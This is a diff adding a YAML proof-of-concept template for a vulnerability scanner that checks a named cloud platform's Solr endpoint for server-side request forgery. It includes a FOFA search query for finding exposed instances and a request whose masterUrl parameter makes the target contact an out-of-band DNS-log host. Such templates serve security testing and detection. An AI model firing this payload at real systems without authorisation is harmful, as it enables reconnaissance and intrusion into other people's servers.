@@ -1,0 +1,18 @@
+id: poc-yaml-tai-bo-yun-solr-ssrf
+info:
+  name: 泰博云平台 solr SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 泰博云平台
+  fofa: title="泰博云平台"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /solr/collection1/replication/?command=fetchindex&masterUrl=http://{{.domain}}
+  expression: status_code == 200 && contains(body,`<str name="status">OK</str>`) &&
+    contains(content_type,"application/xml") && reverse.Verify()
+transport: http
